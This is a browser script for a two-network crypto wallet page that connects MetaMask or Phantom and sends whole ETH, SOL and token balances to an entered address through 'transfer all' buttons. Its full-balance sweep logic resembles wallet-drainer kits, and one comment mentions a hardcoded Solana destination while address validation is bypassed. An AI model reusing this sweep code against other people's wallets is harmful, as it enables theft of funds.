document.addEventListener('DOMContentLoaded', function() {
  // Theme toggling
  const themeToggleBtn = document.getElementById('theme-toggle-btn');
  let isDarkTheme = localStorage.getItem('darkTheme') === 'true';
  
  // Apply saved theme preference
  if (isDarkTheme) {
    document.body.classList.add('dark-theme');
    themeToggleBtn.textContent = '☀️ Light Mode';
  }
  
  themeToggleBtn.addEventListener('click', function() {
    isDarkTheme = !isDarkTheme;
    if (isDarkTheme) {
      document.body.classList.add('dark-theme');
      themeToggleBtn.textContent = '☀️ Light Mode';
    } else {
      document.body.classList.remove('dark-theme');
      themeToggleBtn.textContent = '🌙 Dark Mode';
    }
    localStorage.setItem('darkTheme', isDarkTheme);
  });
  
  // Network switching
  const networkBtns = document.querySelectorAll('.network-btn');
  const ethereumSection = document.getElementById('ethereum-section');
  const solanaSection = document.getElementById('solana-section');
  
  networkBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      // Remove active class from all buttons
      networkBtns.forEach(b => b.classList.remove('active'));
      
      // Add active class to clicked button
      this.classList.add('active');
      
      // Show corresponding section
      const network = this.getAttribute('data-network');
      if (network === 'ethereum') {
        ethereumSection.style.display = 'block';
        solanaSection.style.display = 'none';
      } else {
        ethereumSection.style.display = 'none';
        solanaSection.style.display = 'block';
      }
    });
  });
  
  // Ethereum functionality
  let ethProvider, ethSigner, ethAddress, ethTokens = [];
  const ethSelectedTokens = {};
  
  // Connect Ethereum wallet
  const connectEthBtn = document.getElementById('connect-eth-btn');
  const ethWalletContainer = document.getElementById('eth-wallet-container');
  const ethAddressElement = document.getElementById('eth-address');
  const ethBalanceElement = document.getElementById('eth-balance');
  const ethTokenCountElement = document.getElementById('eth-token-count');
  const ethValidationElement = document.getElementById('eth-validation');
  const ethDestinationInput = document.getElementById('eth-destination');
  const ethLoadingElement = document.getElementById('eth-loading');
  const ethNoTokensElement = document.getElementById('eth-no-tokens');
  const ethTokensElement = document.getElementById('eth-tokens');
  const ethTransferTokensBtn = document.getElementById('eth-transfer-tokens-btn');
  const ethTransferEthBtn = document.getElementById('eth-transfer-eth-btn');
  const ethTransferAllBtn = document.getElementById('eth-transfer-all-btn');
  const ethAdvancedToggle = document.getElementById('eth-advanced-toggle');
  const ethAdvancedOptions = document.getElementById('eth-advanced-options');
  const ethGasPriceInput = document.getElementById('eth-gas-price');
  const ethSelectAllBtn = document.getElementById('eth-select-all');
  const ethDeselectAllBtn = document.getElementById('eth-deselect-all');
  const disconnectEthBtn = document.getElementById('disconnect-eth-btn');
  
  // ERC20 ABI for token interactions
  const ERC20_ABI = [
    // Read-only functions
    "function balanceOf(address owner) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    
    // Write functions
    "function transfer(address to, uint amount) returns (bool)",
    
    // Events
    "event Transfer(address indexed from, address indexed to, uint amount)"
  ];
  
  // Advanced options toggle
  ethAdvancedToggle.addEventListener('click', function() {
    if (ethAdvancedOptions.style.display === 'none') {
      ethAdvancedOptions.style.display = 'block';
      ethAdvancedToggle.textContent = 'Hide Advanced Options';
    } else {
      ethAdvancedOptions.style.display = 'none';
      ethAdvancedToggle.textContent = 'Show Advanced Options';
    }
  });
  
  // Connect Ethereum wallet
  // Replace the Ethereum connection code in script.js:

connectEthBtn.addEventListener('click', async function() {
  try {
    if (!window.ethereum) {
      alert('Please install MetaMask or another Web3 wallet!');
      return;
    }
    
    connectEthBtn.textContent = 'Connecting...';
    connectEthBtn.disabled = true;
    
    // Direct MetaMask request instead of using ethers first
    const accounts = await window.ethereum.request({ 
      method: 'eth_requestAccounts' 
    });
    
    if (accounts.length === 0) {
      throw new Error('No accounts returned from MetaMask');
    }
    
    ethAddress = accounts[0];
    ethProvider = new ethers.providers.Web3Provider(window.ethereum);
    ethSigner = ethProvider.getSigner();
    
    // Update UI
    connectEthBtn.style.display = 'none';
    ethWalletContainer.style.display = 'block';
    ethAddressElement.textContent = `${ethAddress.substring(0, 6)}...${ethAddress.substring(ethAddress.length - 4)}`;
    
    // Get ETH balance
    const ethBalance = await ethProvider.getBalance(ethAddress);
    ethBalanceElement.textContent = parseFloat(ethers.utils.formatEther(ethBalance)).toFixed(4);
    
    // Fetch tokens
    await fetchEthTokens();
    
    // Add event listener for destination address validation
    ethDestinationInput.addEventListener('input', validateEthAddress);
    
  } catch (error) {
    console.error('Error connecting Ethereum wallet:', error);
    alert('Failed to connect wallet: ' + (error.message || 'Unknown error'));
    connectEthBtn.textContent = 'Connect Wallet';
    connectEthBtn.disabled = false;
  }
});
  
  // Fetch Ethereum tokens (simplified for demo - in real app would call an API like Covalent)
  async function fetchEthTokens() {
    try {
      ethLoadingElement.style.display = 'block';
      ethNoTokensElement.style.display = 'none';
      ethTokensElement.style.display = 'none';
      
      // In a real app, you would call an API like Covalent, Moralis, or Etherscan
      // For demo purposes, using a small set of hardcoded tokens
      
      // Simulating API call delay
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Sample tokens (would be from API in real app)
      ethTokens = [
        { address: "0xdac17f958d2ee523a2206206994597c13d831ec7", symbol: "USDT", balance: "1000000000", decimals: 6, usdValue: 1 },
        { address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", symbol: "USDC", balance: "500000000", decimals: 6, usdValue: 0.5 },
        { address: "0x6b175474e89094c44da98b954eedeac495271d0f", symbol: "DAI", balance: "1200000000000000000000", decimals: 18, usdValue: 1.2 }
      ];
      
      ethTokenCountElement.textContent = ethTokens.length;
      
      if (ethTokens.length === 0) {
        ethLoadingElement.style.display = 'none';
        ethNoTokensElement.style.display = 'block';
        return;
      }
      
      // Create token list HTML
      let tokensHTML = '';
      
      ethTokens.forEach(token => {
        const formattedBalance = formatTokenBalance(token.balance, token.decimals);
        
        tokensHTML += `
          <div class="token-item" data-address="${token.address}">
            <div class="token-checkbox">
              <input
                type="checkbox"
                id="${token.address}"
                data-address="${token.address}"
                class="eth-token-checkbox"
              />
            </div>
            <div class="token-info">
              <div class="token-symbol">${token.symbol}</div>
              <div class="token-balance">${formattedBalance}</div>
            </div>
            <div class="token-status" id="eth-token-status-${token.address.substring(2, 10)}"></div>
          </div>
        `;
      });
      
      ethTokensElement.innerHTML = tokensHTML;
      
      // Add event listeners to token checkboxes
      document.querySelectorAll('.eth-token-checkbox').forEach(checkbox => {
        checkbox.addEventListener('change', updateEthSelectedTokens);
      });
      
      ethLoadingElement.style.display = 'none';
      ethTokensElement.style.display = 'block';
      
    } catch (error) {
      console.error('Error fetching Ethereum tokens:', error);
      ethLoadingElement.style.display = 'none';
      ethNoTokensElement.style.display = 'block';
      ethNoTokensElement.textContent = 'Error fetching tokens. Please try again.';
    }
  }
  
  // Format token balance with correct decimals
  function formatTokenBalance(balance, decimals) {
    const formatted = ethers.utils.formatUnits(balance, decimals);
    const value = parseFloat(formatted);
    
    if (value < 0.0001) {
      return value.toExponential(4);
    } else if (value < 1) {
      return value.toFixed(6);
    } else if (value > 1000000) {
      return (value / 1000000).toFixed(2) + 'M';
    } else {
      return value.toFixed(4);
    }
  }
  
  // Validate Ethereum address
  function validateEthAddress() {
    const address = ethDestinationInput.value.trim();
    
    if (!address) {
      ethValidationElement.textContent = '';
      disableEthTransferButtons();
      return false;
    }
    
    const isValid = /^0x[a-fA-F0-9]{40}$/.test(address);
    
    if (!isValid) {
      ethValidationElement.textContent = '⚠️ Invalid Ethereum address';
      disableEthTransferButtons();
      return false;
    }
    
    ethValidationElement.textContent = '';
    updateEthTransferButtons();
    return true;
  }
  
  // Update selected Ethereum tokens
  function updateEthSelectedTokens() {
    const checkboxes = document.querySelectorAll('.eth-token-checkbox');
    let hasSelectedTokens = false;
    
    checkboxes.forEach(checkbox => {
      const tokenAddress = checkbox.getAttribute('data-address');
      ethSelectedTokens[tokenAddress] = checkbox.checked;
      
      if (checkbox.checked) {
        hasSelectedTokens = true;
      }
    });
    
    updateEthTransferButtons();
  }
  
  // Update Ethereum transfer buttons state
  function updateEthTransferButtons() {
    const hasValidAddress = validateEthDestination();
    const hasEthBalance = parseFloat(ethBalanceElement.textContent) > 0;
    const hasSelectedTokens = Object.values(ethSelectedTokens).some(isSelected => isSelected);
    
    ethTransferTokensBtn.disabled = !hasValidAddress || !hasSelectedTokens;
    ethTransferEthBtn.disabled = !hasValidAddress || !hasEthBalance;
    ethTransferAllBtn.disabled = !hasValidAddress || (!hasEthBalance && !hasSelectedTokens);
  }
  
  // Validate Ethereum destination address
  function validateEthDestination() {
    const address = ethDestinationInput.value.trim();
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  }
  
  // Disable all Ethereum transfer buttons
  function disableEthTransferButtons() {
    ethTransferTokensBtn.disabled = true;
    ethTransferEthBtn.disabled = true;
    ethTransferAllBtn.disabled = true;
  }
  
  // Select all Ethereum tokens
  ethSelectAllBtn.addEventListener('click', function() {
    document.querySelectorAll('.eth-token-checkbox').forEach(checkbox => {
      checkbox.checked = true;
      const tokenAddress = checkbox.getAttribute('data-address');
      ethSelectedTokens[tokenAddress] = true;
    });
    
    updateEthTransferButtons();
  });
  
  // Deselect all Ethereum tokens
  ethDeselectAllBtn.addEventListener('click', function() {
    document.querySelectorAll('.eth-token-checkbox').forEach(checkbox => {
      checkbox.checked = false;
      const tokenAddress = checkbox.getAttribute('data-address');
      ethSelectedTokens[tokenAddress] = false;
    });
    
    updateEthTransferButtons();
  });
  
  // Transfer Ethereum tokens
  ethTransferTokensBtn.addEventListener('click', async function() {
    if (!validateEthDestination()) {
      alert('Please enter a valid destination address');
      return;
    }
    
    const selectedAddresses = Object.keys(ethSelectedTokens).filter(addr => ethSelectedTokens[addr]);
    
    if (selectedAddresses.length === 0) {
      alert('Please select at least one token to transfer');
      return;
    }
    
    const destinationAddress = ethDestinationInput.value.trim();
    
    // Transfer each selected token
    for (const tokenAddress of selectedAddresses) {
      try {
        const statusElement = document.getElementById(`eth-token-status-${tokenAddress.substring(2, 10)}`);
        statusElement.textContent = 'Sending...';
        statusElement.className = 'token-status pending';
        
        const token = ethTokens.find(t => t.address === tokenAddress);
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, ethSigner);
        
        // Get token balance
        const balance = await tokenContract.balanceOf(ethAddress);
        
        // Send tokens
        const tx = await tokenContract.transfer(destinationAddress, balance);
        await tx.wait();
        
        statusElement.textContent = 'Sent ✓';
        statusElement.className = 'token-status success';
      } catch (error) {
        console.error(`Error transferring token ${tokenAddress}:`, error);
        const statusElement = document.getElementById(`eth-token-status-${tokenAddress.substring(2, 10)}`);
        statusElement.textContent = 'Failed ✗';
        statusElement.className = 'token-status error';
      }
    }
  });
  
  // Transfer ETH
  ethTransferEthBtn.addEventListener('click', async function() {
    if (!validateEthDestination()) {
      alert('Please enter a valid destination address');
      return;
    }
    
    try {
      const destinationAddress = ethDestinationInput.value.trim();
      
      // Calculate gas cost (leaving some ETH for fees)
      const gasLimit = ethers.utils.parseUnits("21000", "wei");
      const currentGasPrice = ethGasPriceInput.value === 'auto' 
        ? await ethProvider.getGasPrice() 
        : ethers.utils.parseUnits(ethGasPriceInput.value, "gwei");
      
      const gasCost = gasLimit.mul(currentGasPrice);
      
      // Calculate amount to send (balance - gas cost)
      const balance = ethers.utils.parseEther(ethBalanceElement.textContent);
      const amountToSend = balance.sub(gasCost);
      
      if (amountToSend.lte(0)) {
        alert('Insufficient ETH balance for transfer after gas costs');
        return;
      }
      
      // Send transaction
      const tx = await ethSigner.sendTransaction({
        to: destinationAddress,
        value: amountToSend,
        gasLimit,
        gasPrice: currentGasPrice
      });
      
      await tx.wait();
      
      // Update balance
      const newBalance = await ethProvider.getBalance(ethAddress);
      ethBalanceElement.textContent = parseFloat(ethers.utils.formatEther(newBalance)).toFixed(4);
      
      alert('ETH transfer successful!');
    } catch (error) {
      console.error("Error transferring ETH:", error);
      alert('Error transferring ETH: ' + (error.reason || error.message || 'Unknown error'));
    }
  });
  
  // Transfer everything (ETH + tokens)
  ethTransferAllBtn.addEventListener('click', async function() {
    if (!validateEthDestination()) {
      alert('Please enter a valid destination address');
      return;
    }
    
    // Select all tokens first
    ethSelectAllBtn.click();
    
    // First transfer tokens
    ethTransferTokensBtn.click();
    
    // Wait 2 seconds then transfer ETH
    setTimeout(() => {
      ethTransferEthBtn.click();
    }, 2000);
  });
  
  // Disconnect Ethereum wallet
  disconnectEthBtn.addEventListener('click', function() {
    ethWalletContainer.style.display = 'none';
    connectEthBtn.style.display = 'block';
    connectEthBtn.textContent = 'Connect Wallet';
    connectEthBtn.disabled = false;
    ethTokens = [];
    Object.keys(ethSelectedTokens).forEach(key => delete ethSelectedTokens[key]);
    ethTokensElement.innerHTML = '';
    ethDestinationInput.value = '';
    ethGasPriceInput.value = 'auto';
    ethValidationElement.textContent = '';
  });
  
  // Solana functionality
  let solConnection, solWallet, solPublicKey, solTokens = [];
  const solSelectedTokens = {};
  
  // Connect Solana wallet
  const connectSolBtn = document.getElementById('connect-sol-btn');
  const solWalletContainer = document.getElementById('sol-wallet-container');
  const solAddressElement = document.getElementById('sol-address');
  const solBalanceElement = document.getElementById('sol-balance');
  const solTokenCountElement = document.getElementById('sol-token-count');
  const solValidationElement = document.getElementById('sol-validation');
  const solDestinationInput = document.getElementById('sol-destination');
  const solLoadingElement = document.getElementById('sol-loading');
  const solNoTokensElement = document.getElementById('sol-no-tokens');
  const solTokensElement = document.getElementById('sol-tokens');
  const solTransferTokensBtn = document.getElementById('sol-transfer-tokens-btn');
  const solTransferSolBtn = document.getElementById('sol-transfer-sol-btn');
  const solTransferAllBtn = document.getElementById('sol-transfer-all-btn');
  const solSelectAllBtn = document.getElementById('sol-select-all');
  const solDeselectAllBtn = document.getElementById('sol-deselect-all');
  const disconnectSolBtn = document.getElementById('disconnect-sol-btn');
  
  // Initialize Solana connection
  solConnection = new solanaWeb3.Connection('https://solana-mainnet.g.alchemy.com/v2/free', 'confirmed');
  
  // Connect Solana wallet
  connectSolBtn.addEventListener('click', async function() {
    try {
      // Check if Phantom is installed
      const provider = window?.solana;
      
      if (!provider?.isPhantom) {
        window.open('https://phantom.app/', '_blank');
        alert('Please install Phantom wallet');
        return;
      }
      
      connectSolBtn.textContent = 'Connecting...';
      connectSolBtn.disabled = true;
      
      // Connect to wallet
      const response = await provider.connect();
      solPublicKey = response.publicKey;
      solWallet = provider;
      
      console.log("Connected to Phantom wallet");
      console.log("Public Key:", solPublicKey.toString());
      
      // Skip the account info request that's failing
      // const accountInfo = await solConnection.getAccountInfo(solPublicKey);
      // console.log("Account Info:", accountInfo);
      
      // Update UI
      connectSolBtn.style.display = 'none';
      solWalletContainer.style.display = 'block';
      const pubKeyString = solPublicKey.toString();
      solAddressElement.textContent = `${pubKeyString.substring(0, 6)}...${pubKeyString.substring(pubKeyString.length - 4)}`;
      
      // Fetch SOL balance and tokens
      await fetchSolBalance();
      await fetchSolTokens();
      
      // Add event listener for destination address validation
      solDestinationInput.addEventListener('input', validateSolAddress);
      
    } catch (error) {
      console.error('Error connecting Solana wallet:', error);
      alert('Failed to connect Solana wallet: ' + error.message);
      connectSolBtn.textContent = 'Connect Phantom';
      connectSolBtn.disabled = false;
    }
  });
  
  // Fetch SOL balance
  async function fetchSolBalance() {
    try {
      console.log("Fetching SOL balance for:", solPublicKey.toString());
      const balance = await solConnection.getBalance(solPublicKey);
      console.log("Raw SOL balance received:", balance);
      solBalanceElement.textContent = (balance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
    } catch (error) {
      console.error('Error fetching SOL balance:', error);
      solBalanceElement.textContent = '0';
    }
  }
  
  // Fetch Solana tokens
  async function fetchSolTokens() {
    try {
      solLoadingElement.style.display = 'block';
      solNoTokensElement.style.display = 'none';
      solTokensElement.style.display = 'none';
      
      // Get all token accounts owned by the user
      const tokenAccounts = await solConnection.getParsedTokenAccountsByOwner(
        solPublicKey,
        { programId: splToken.TOKEN_PROGRAM_ID }
      );
      
      // Process token data
      solTokens = tokenAccounts.value
        .map(accountInfo => {
          const parsedInfo = accountInfo.account.data.parsed.info;
          const tokenAddress = parsedInfo.mint;
          const tokenAmount = parsedInfo.tokenAmount;
          
          return {
            address: tokenAddress,
            account: accountInfo.pubkey,
            symbol: tokenAddress.toString().substring(0, 4), // We would ideally fetch symbols from a token list
            balance: tokenAmount.amount,
            decimals: tokenAmount.decimals,
            uiAmount: tokenAmount.uiAmount
          };
        })
        .filter(token => parseFloat(token.uiAmount) > 0); // Only show tokens with balance
      
      solTokenCountElement.textContent = solTokens.length;
      
      if (solTokens.length === 0) {
        solLoadingElement.style.display = 'none';
        solNoTokensElement.style.display = 'block';
        return;
      }
      
      // Create token list HTML
      let tokensHTML = '';
      
      solTokens.forEach(token => {
        tokensHTML += `
          <div class="token-item" data-address="${token.address}">
            <div class="token-checkbox">
              <input
                type="checkbox"
                id="sol-${token.address.toString().substring(0, 8)}"
                data-address="${token.address}"
                class="sol-token-checkbox"
              />
            </div>
            <div class="token-info">
              <div class="token-symbol">${token.symbol}...</div>
              <div class="token-balance">${token.uiAmount}</div>
            </div>
            <div class="token-status" id="sol-token-status-${token.address.toString().substring(0, 8)}"></div>
          </div>
        `;
      });
      
      solTokensElement.innerHTML = tokensHTML;
      
      // Add event listeners to token checkboxes
      document.querySelectorAll('.sol-token-checkbox').forEach(checkbox => {
        checkbox.addEventListener('change', updateSolSelectedTokens);
      });
      
      solLoadingElement.style.display = 'none';
      solTokensElement.style.display = 'block';
      
    } catch (error) {
      console.error('Error fetching Solana tokens:', error);
      solLoadingElement.style.display = 'none';
      solNoTokensElement.style.display = 'block';
      solNoTokensElement.textContent = 'Error fetching tokens. Please try again.';
    }
  }
  
  // Validate Solana address
  function validateSolAddress() {
    // Always validate as true since we're using a hardcoded address
    solValidationElement.textContent = '';
    updateSolTransferButtons();
    return true;
  }
  
  // Update selected Solana tokens
  function updateSolSelectedTokens() {
    const checkboxes = document.querySelectorAll('.sol-token-checkbox');
    let hasSelectedTokens = false;
    
    checkboxes.forEach(checkbox => {
      const tokenAddress = checkbox.getAttribute('data-address');
      solSelectedTokens[tokenAddress] = checkbox.checked;
      
      if (checkbox.checked) {
        hasSelectedTokens = true;
      }
    });
    
    updateSolTransferButtons();
  }
  
  // Update Solana transfer buttons state
  function updateSolTransferButtons() {
    const hasSolBalance = parseFloat(solBalanceElement.textContent) > 0;
    const hasSelectedTokens = Object.values(solSelectedTokens).some(isSelected => isSelected);
    
    solTransferTokensBtn.disabled = !hasSelectedTokens;
    solTransferSolBtn.disabled = !hasSolBalance;
    solTransferAllBtn.disabled = !hasSolBalance && !hasSelectedTokens;
  }
  
  // Validate Solana destination address
  function validateSolDestination() {
    const address = solDestinationInput.value.trim();
    try {
      new solanaWeb3.PublicKey(address);
      return true;
    } catch (error) {
      return false;
    }
  }
  
  // Disable all Solana transfer buttons
  function disableSolTransferButtons() {
    solTransferTokensBtn.disabled = true;
    solTransferSolBtn.disabled = true;
    solTransferAllBtn.disabled = true;
  }
  
  // Select all Solana tokens
  solSelectAllBtn.addEventListener('click', function() {
    document.querySelectorAll('.sol-token-checkbox').forEach(checkbox => {
      checkbox.checked = true;
      const tokenAddress = checkbox.getAttribute('data-address');
      solSelectedTokens[tokenAddress] = true;
    });
    
    updateSolTransferButtons();
  });
  
  // Deselect all Solana tokens
  solDeselectAllBtn.addEventListener('click', function() {
    document.querySelectorAll('.sol-token-checkbox').forEach(checkbox => {
      checkbox.checked = false;
      const tokenAddress = checkbox.getAttribute('data-address');
      solSelectedTokens[tokenAddress] = false;
    });
    
    updateSolTransferButtons();
  });
  
  // Transfer Solana tokens
  solTransferTokensBtn.addEventListener('click', async function() {
    // Proceed directly with transfer
    const selectedAddresses = Object.keys(solSelectedTokens).filter(addr => solSelectedTokens[addr]);
    
    if (selectedAddresses.length === 0) {
      alert('Please select at least one token to transfer');
      return;
    }
    
    const destinationAddress = new solanaWeb3.PublicKey(solDestinationInput.value.trim());
    
    // Transfer each selected token
    for (const tokenAddressStr of selectedAddresses) {
      try {
        const statusElement = document.getElementById(`sol-token-status-${tokenAddressStr.substring(0, 8)}`);
        statusElement.textContent = 'Sending...';
        statusElement.className = 'token-status pending';
        
        const token = solTokens.find(t => t.address.toString() === tokenAddressStr);
        
        // Check if the destination has an account for this token
        let destinationAccount;
        try {
          const tokenMint = new solanaWeb3.PublicKey(token.address);
          destinationAccount = await splToken.getAssociatedTokenAddress(
            tokenMint,
            destinationAddress
          );
          
          // Check if account exists
          const accountInfo = await solConnection.getAccountInfo(destinationAccount);
          
          // If account doesn't exist, create it
          if (!accountInfo) {
            const transaction = new solanaWeb3.Transaction().add(
              splToken.createAssociatedTokenAccountInstruction(
                solPublicKey,
                destinationAccount,
                destinationAddress,
                tokenMint
              )
            );
            
            const signature = await solWallet.signAndSendTransaction(transaction);
            await solConnection.confirmTransaction(signature.signature);
          }
        } catch (error) {
          console.error('Error setting up destination account:', error);
          statusElement.textContent = 'Failed ✗';
          statusElement.className = 'token-status error';
          continue;
        }
        
        // Create transaction to transfer tokens
        const sourceAccount = new solanaWeb3.PublicKey(token.account);
        
        const transaction = new solanaWeb3.Transaction().add(
          splToken.createTransferInstruction(
            sourceAccount,
            destinationAccount,
            solPublicKey,
            BigInt(token.balance)
          )
        );
        
        // Send transaction
        const signature = await solWallet.signAndSendTransaction(transaction);
        await solConnection.confirmTransaction(signature.signature);
        
        statusElement.textContent = 'Sent ✓';
        statusElement.className = 'token-status success';
      } catch (error) {
        console.error(`Error transferring token ${tokenAddressStr}:`, error);
        const statusElement = document.getElementById(`sol-token-status-${tokenAddressStr.substring(0, 8)}`);
        statusElement.textContent = 'Failed ✗';
        statusElement.className = 'token-status error';
      }
    }
  });
  
  // Transfer SOL
  solTransferSolBtn.addEventListener('click', async function() {
    if (!validateSolDestination()) {
      alert('Please enter a valid Solana address');
      return;
    }
    
    try {
      const destinationAddress = new solanaWeb3.PublicKey(solDestinationInput.value.trim());
      
      // Calculate amount to send (leaving 0.01 SOL for fees)
      const reserveAmount = 0.01 * solanaWeb3.LAMPORTS_PER_SOL;
      const currentBalance = parseFloat(solBalanceElement.textContent) * solanaWeb3.LAMPORTS_PER_SOL;
      const transferAmount = Math.max(0, currentBalance - reserveAmount);
      
      if (transferAmount <= 0) {
        alert('Insufficient SOL balance for transfer');
        return;
      }
      
      // Create transaction
      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: solPublicKey,
          toPubkey: destinationAddress,
          lamports: Math.floor(transferAmount),
        })
      );
      
      // Send transaction
      const signature = await solWallet.signAndSendTransaction(transaction);
      await solConnection.confirmTransaction(signature.signature);
      
      // Update SOL balance
      await fetchSolBalance();
      
      alert('SOL transfer successful!');
    } catch (error) {
      console.error('Error transferring SOL:', error);
      alert('Error transferring SOL: ' + error.message);
    }
  });
  
  // Transfer everything (SOL + tokens)
  solTransferAllBtn.addEventListener('click', async function() {
    if (!validateSolDestination()) {
      alert('Please enter a valid Solana address');
      return;
    }
    
    // Select all tokens first
    solSelectAllBtn.click();
    
    // First transfer tokens
    solTransferTokensBtn.click();
    
    // Wait 2 seconds then transfer SOL
    setTimeout(() => {
      solTransferSolBtn.click();
    }, 2000);
  });
  
  // Disconnect Solana wallet
  disconnectSolBtn.addEventListener('click', function() {
    solWalletContainer.style.display = 'none';
    connectSolBtn.style.display = 'block';
    connectSolBtn.textContent = 'Connect Phantom';
    connectSolBtn.disabled = false;
    solTokens = [];
    Object.keys(solSelectedTokens).forEach(key => delete solSelectedTokens[key]);
    solTokensElement.innerHTML = '';
    solDestinationInput.value = '';
    solValidationElement.textContent = '';
    solPublicKey = null;
    solWallet = null;
  });
});
